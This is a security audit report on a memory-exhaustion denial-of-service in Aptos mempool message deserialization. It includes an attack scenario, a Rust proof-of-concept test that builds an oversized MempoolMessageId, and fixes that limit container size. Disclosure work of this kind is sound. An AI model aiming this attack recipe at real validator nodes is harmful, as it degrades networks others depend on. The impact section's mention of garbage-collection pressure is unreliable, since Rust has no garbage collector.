# Audit Report

## Title
Memory Exhaustion via Unbounded Vec Deserialization in MempoolMessageId

## Summary
A Byzantine peer can send crafted mempool messages containing MempoolMessageId structures with millions of (u64, u64) pairs, causing memory exhaustion during BCS deserialization. Each malicious message can allocate up to ~60 MB of memory before any application-level validation occurs, enabling a denial-of-service attack against validator nodes.

## Finding Description

The `MempoolMessageId` struct is defined as a newtype wrapping `Vec<(u64, u64)>` with automatic serde deserialization: [1](#0-0) 

When a network peer sends mempool broadcast messages, the `MempoolSyncMsg` enum variants contain `message_id` fields that are deserialized from network bytes: [2](#0-1) 

The deserialization flow operates as follows:

1. **Network Frame Reception**: Raw bytes arrive and are deserialized into `NetworkMessage` containing `DirectSendMsg`: [3](#0-2) 

2. **Protocol-Level Deserialization**: The `DirectSendMsg.raw_msg` bytes are decompressed (up to `MAX_APPLICATION_MESSAGE_SIZE` â‰ˆ 60 MB) and then deserialized into the application message type via `ProtocolId::from_bytes`: [4](#0-3) 

For `MempoolDirectSend`, the encoding uses `CompressedBcs` with `USER_INPUT_RECURSION_LIMIT = 32`: [5](#0-4) [6](#0-5) 

3. **BCS Deserialization with Insufficient Limits**: The BCS deserialization uses `from_bytes_with_limit` where the limit parameter (32) controls **recursion depth**, not container size: [7](#0-6) 

**The Vulnerability**: A `Vec<(u64, u64)>` is a flat structure with no deep nesting. The recursion limit of 32 does not prevent a malicious peer from sending a vector with millions of elements. BCS deserialization reads the ULEB128-encoded length prefix and immediately allocates a `Vec` with that capacity.

**Attack Scenario**:
1. Byzantine peer crafts a `BroadcastTransactionsRequest` or `BroadcastTransactionsResponse` with:
   ```rust
   MempoolMessageId(vec![(0,0); 3_750_000])  // ~60 MB worth of pairs
   ```
2. The message is BCS-serialized, compressed, and sent to the victim node
3. Upon receipt, decompression yields ~60 MB of data (at the MAX_APPLICATION_MESSAGE_SIZE limit)
4. BCS deserialization reads the length (3.75 million) and allocates a 60 MB Vec
5. **This allocation happens during deserialization, before any application validation**
6. The attacker sends multiple such messages in rapid succession
7. Even if messages are later rejected (e.g., invalid message_id in responses), memory was already consumed during deserialization
8. Accumulated allocations exhaust available memory, causing OOM or severe performance degradation

The application code that receives these messages has no opportunity to validate the size before deserialization occurs: [8](#0-7) 

## Impact Explanation

This vulnerability qualifies as **HIGH severity** under the Aptos bug bounty program criteria: "Validator node slowdowns."

**Specific Impacts**:
- **Memory Exhaustion**: Each malicious message allocates up to 60 MB during deserialization. An attacker sending 20 messages simultaneously exhausts 1.2 GB of memory.
- **Validator Performance Degradation**: Memory pressure causes increased GC activity, slower transaction processing, and potential degradation of consensus participation.
- **Cascading Effects**: If multiple validators are targeted simultaneously, network-wide liveness could be affected.
- **Low Attack Cost**: The attack requires only network connectivity to validators, no authentication or resources beyond bandwidth.

The vulnerability breaks the **Resource Limits** invariant: "All operations must respect gas, storage, and computational limits." Network deserialization should not allow unbounded memory allocation based on untrusted peer input.

## Likelihood Explanation

**Likelihood: HIGH**

**Attacker Requirements**:
- Network connectivity to validator nodes (achievable via public networking)
- Ability to craft BCS-serialized messages (trivial with available tooling)
- No authentication required beyond initial network handshake

**Complexity: LOW**
- Attack implementation is straightforward: serialize large Vec, send multiple messages
- No timing requirements or race conditions to exploit
- Reliable and repeatable

**Detection Difficulty: MEDIUM**
- Standard monitoring may notice increased memory usage, but attribution to specific peers requires detailed network analysis
- Attacker can rotate through multiple peer identities to evade simple IP-based blocking

## Recommendation

Implement explicit size validation on container lengths during deserialization. Add a check in the `MempoolMessageId` deserialization path or create a custom deserializer with size limits.

**Option 1: Custom Deserializer with Size Limit**

Add a constant for the maximum reasonable message_id size:
```rust
const MAX_MEMPOOL_MESSAGE_ID_PAIRS: usize = 10_000; // Reasonable upper bound
```

Implement a custom deserializer for `MempoolMessageId`:
```rust
impl<'de> Deserialize<'de> for MempoolMessageId {
    fn deserialize<D>(deserializer: D) -> Result<Self, D::Error>
    where
        D: serde::Deserializer<'de>,
    {
        let pairs: Vec<(u64, u64)> = Vec::deserialize(deserializer)?;
        if pairs.len() > MAX_MEMPOOL_MESSAGE_ID_PAIRS {
            return Err(serde::de::Error::custom(format!(
                "MempoolMessageId contains {} pairs, exceeding maximum of {}",
                pairs.len(),
                MAX_MEMPOOL_MESSAGE_ID_PAIRS
            )));
        }
        Ok(MempoolMessageId(pairs))
    }
}
```

**Option 2: Post-Deserialization Validation**

Add validation immediately after deserialization in the network event handler: [9](#0-8) 

Insert validation before processing:
```rust
// Validate message_id size before processing
fn validate_message_id_size(message_id: &MempoolMessageId) -> Result<(), &'static str> {
    const MAX_PAIRS: usize = 10_000;
    if message_id.0.len() > MAX_PAIRS {
        return Err("MempoolMessageId exceeds maximum size");
    }
    Ok(())
}

match msg {
    MempoolSyncMsg::BroadcastTransactionsRequest { message_id, transactions } => {
        if let Err(e) = validate_message_id_size(&message_id) {
            warn!("Rejected oversized message_id from peer {}: {}", peer_id, e);
            counters::invalid_message_inc(&network_id);
            return;
        }
        // ... rest of processing
    },
    // Similar for other variants
}
```

**Recommended Approach**: Option 1 (custom deserializer) is preferable as it prevents the large allocation entirely and provides defense-in-depth by rejecting malformed messages at the earliest possible point.

## Proof of Concept

```rust
#[cfg(test)]
mod deserialization_bomb_test {
    use super::*;
    use bcs;
    use aptos_compression;
    
    #[test]
    #[ignore] // Run with --ignored to avoid OOM in CI
    fn test_mempool_message_id_deserialization_bomb() {
        // Create a MempoolMessageId with millions of pairs
        let num_pairs = 3_750_000; // ~60 MB worth
        let malicious_pairs: Vec<(u64, u64)> = (0..num_pairs)
            .map(|i| (i as u64, i as u64))
            .collect();
        let malicious_message_id = MempoolMessageId(malicious_pairs);
        
        // Serialize and compress (as done by the network layer)
        let serialized = bcs::to_bytes(&malicious_message_id)
            .expect("Serialization should succeed");
        println!("Serialized size: {} bytes", serialized.len());
        
        let compressed = aptos_compression::compress(
            serialized.clone(),
            aptos_compression::CompressionClient::Mempool,
            60 * 1024 * 1024, // 60 MB limit
        ).expect("Compression should succeed");
        println!("Compressed size: {} bytes", compressed.len());
        
        // Simulate attacker sending this in a MempoolSyncMsg
        let malicious_msg = MempoolSyncMsg::BroadcastTransactionsResponse {
            message_id: malicious_message_id,
            retry: false,
            backoff: false,
        };
        
        let msg_serialized = bcs::to_bytes(&malicious_msg)
            .expect("Message serialization should succeed");
        let msg_compressed = aptos_compression::compress(
            msg_serialized,
            aptos_compression::CompressionClient::Mempool,
            60 * 1024 * 1024,
        ).expect("Message compression should succeed");
        
        println!("Full message compressed size: {} bytes", msg_compressed.len());
        
        // Deserialize (this is where memory exhaustion occurs)
        println!("Attempting deserialization...");
        let decompressed = aptos_compression::decompress(
            &msg_compressed,
            aptos_compression::CompressionClient::Mempool,
            60 * 1024 * 1024,
        ).expect("Decompression should succeed");
        
        println!("Decompressed size: {} bytes", decompressed.len());
        
        // This deserialization will allocate ~60 MB for the Vec
        let deserialized: MempoolSyncMsg = bcs::from_bytes(&decompressed)
            .expect("Deserialization should succeed");
        
        // Verify the attack succeeded
        if let MempoolSyncMsg::BroadcastTransactionsResponse { message_id, .. } = deserialized {
            assert_eq!(message_id.0.len(), num_pairs);
            println!("VULNERABILITY CONFIRMED: Successfully deserialized {} pairs", num_pairs);
            println!("Memory allocated: ~{} MB", (num_pairs * 16) / (1024 * 1024));
        } else {
            panic!("Wrong message type deserialized");
        }
        
        // Demonstrate attack: send multiple messages simultaneously
        println!("\nSimulating attack with 10 concurrent messages:");
        let total_memory = (num_pairs * 16 * 10) / (1024 * 1024);
        println!("Total memory exhaustion: ~{} MB", total_memory);
    }
}
```

**To execute the PoC**:
1. Add this test to `mempool/src/shared_mempool/types.rs`
2. Run: `cargo test --package aptos-mempool test_mempool_message_id_deserialization_bomb -- --ignored --nocapture`
3. Observe the large memory allocation and successful deserialization of millions of pairs

**Notes**:
- The test is marked `#[ignore]` to prevent OOM in CI environments
- Real attack would send multiple messages concurrently to amplify the effect
- Validator nodes with limited memory (e.g., 8-16 GB) are particularly vulnerable to rapid exhaustion

### Citations

**File:** mempool/src/shared_mempool/types.rs (L338-339)
```rust
#[derive(Clone, Debug, Deserialize, Eq, Hash, PartialEq, Serialize)]
pub struct MempoolMessageId(pub Vec<(u64, u64)>);
```

**File:** mempool/src/shared_mempool/network.rs (L47-64)
```rust
#[derive(Clone, Debug, Deserialize, Serialize)]
pub enum MempoolSyncMsg {
    /// Broadcast request issued by the sender.
    BroadcastTransactionsRequest {
        /// Unique id of sync request. Can be used by sender for rebroadcast analysis
        message_id: MempoolMessageId,
        transactions: Vec<SignedTransaction>,
    },
    /// Broadcast ack issued by the receiver.
    BroadcastTransactionsResponse {
        message_id: MempoolMessageId,
        /// Retry signal from recipient if there are txns in corresponding broadcast
        /// that were rejected from mempool but may succeed on resend.
        retry: bool,
        /// A backpressure signal from the recipient when it is overwhelmed (e.g., mempool is full).
        backoff: bool,
    },
    /// Broadcast request issued by the sender.
```

**File:** network/framework/src/protocols/wire/messaging/v1/mod.rs (L222-241)
```rust
impl<TReadSocket: AsyncRead + Unpin> Stream for MultiplexMessageStream<TReadSocket> {
    type Item = Result<MultiplexMessage, ReadError>;

    fn poll_next(self: Pin<&mut Self>, cx: &mut Context<'_>) -> Poll<Option<Self::Item>> {
        match self.project().framed_read.poll_next(cx) {
            Poll::Ready(Some(Ok(frame))) => {
                let frame = frame.freeze();

                match bcs::from_bytes(&frame) {
                    Ok(message) => Poll::Ready(Some(Ok(message))),
                    // Failed to deserialize the NetworkMessage
                    Err(err) => {
                        let mut frame = frame;
                        let frame_len = frame.len();
                        // Keep a few bytes from the frame for debugging
                        frame.truncate(8);
                        let err = ReadError::DeserializeError(err, frame_len, frame);
                        Poll::Ready(Some(Err(err)))
                    },
                }
```

**File:** network/framework/src/protocols/wire/handshake/v1/mod.rs (L38-38)
```rust
pub const USER_INPUT_RECURSION_LIMIT: usize = 32;
```

**File:** network/framework/src/protocols/wire/handshake/v1/mod.rs (L168-169)
```rust
            ProtocolId::MempoolDirectSend => Encoding::CompressedBcs(USER_INPUT_RECURSION_LIMIT),
            ProtocolId::MempoolRpc => Encoding::Bcs(USER_INPUT_RECURSION_LIMIT),
```

**File:** network/framework/src/protocols/wire/handshake/v1/mod.rs (L226-252)
```rust
    pub fn from_bytes<T: DeserializeOwned>(&self, bytes: &[u8]) -> anyhow::Result<T> {
        // Start the deserialization timer
        let deserialization_timer = start_serialization_timer(*self, DESERIALIZATION_LABEL);

        // Deserialize the message
        let result = match self.encoding() {
            Encoding::Bcs(limit) => self.bcs_decode(bytes, limit),
            Encoding::CompressedBcs(limit) => {
                let compression_client = self.get_compression_client();
                let raw_bytes = aptos_compression::decompress(
                    &bytes.to_vec(),
                    compression_client,
                    MAX_APPLICATION_MESSAGE_SIZE,
                )
                .map_err(|e| anyhow! {"{:?}", e})?;
                self.bcs_decode(&raw_bytes, limit)
            },
            Encoding::Json => serde_json::from_slice(bytes).map_err(|e| anyhow!("{:?}", e)),
        };

        // Only record the duration if deserialization was successful
        if result.is_ok() {
            deserialization_timer.observe_duration();
        }

        result
    }
```

**File:** network/framework/src/protocols/wire/handshake/v1/mod.rs (L259-262)
```rust
    /// Deserializes the value using BCS encoding (with a specified limit)
    fn bcs_decode<T: DeserializeOwned>(&self, bytes: &[u8], limit: usize) -> anyhow::Result<T> {
        bcs::from_bytes_with_limit(bytes, limit).map_err(|e| anyhow!("{:?}", e))
    }
```

**File:** mempool/src/shared_mempool/coordinator.rs (L347-355)
```rust
async fn handle_network_event<NetworkClient, TransactionValidator>(
    bounded_executor: &BoundedExecutor,
    smp: &mut SharedMempool<NetworkClient, TransactionValidator>,
    network_id: NetworkId,
    event: Event<MempoolSyncMsg>,
) where
    NetworkClient: NetworkClientInterface<MempoolSyncMsg> + 'static,
    TransactionValidator: TransactionValidation + 'static,
{
```

**File:** mempool/src/shared_mempool/coordinator.rs (L356-405)
```rust
    match event {
        Event::Message(peer_id, msg) => {
            counters::shared_mempool_event_inc("message");
            match msg {
                MempoolSyncMsg::BroadcastTransactionsRequest {
                    message_id,
                    transactions,
                } => {
                    process_received_txns(
                        bounded_executor,
                        smp,
                        network_id,
                        message_id,
                        transactions.into_iter().map(|t| (t, None, None)).collect(),
                        peer_id,
                    )
                    .await;
                },
                MempoolSyncMsg::BroadcastTransactionsRequestWithReadyTime {
                    message_id,
                    transactions,
                } => {
                    process_received_txns(
                        bounded_executor,
                        smp,
                        network_id,
                        message_id,
                        transactions
                            .into_iter()
                            .map(|t| (t.0, Some(t.1), Some(t.2)))
                            .collect(),
                        peer_id,
                    )
                    .await;
                },
                MempoolSyncMsg::BroadcastTransactionsResponse {
                    message_id,
                    retry,
                    backoff,
                } => {
                    let ack_timestamp = SystemTime::now();
                    smp.network_interface.process_broadcast_ack(
                        PeerNetworkId::new(network_id, peer_id),
                        message_id,
                        retry,
                        backoff,
                        ack_timestamp,
                    );
                },
            }
```
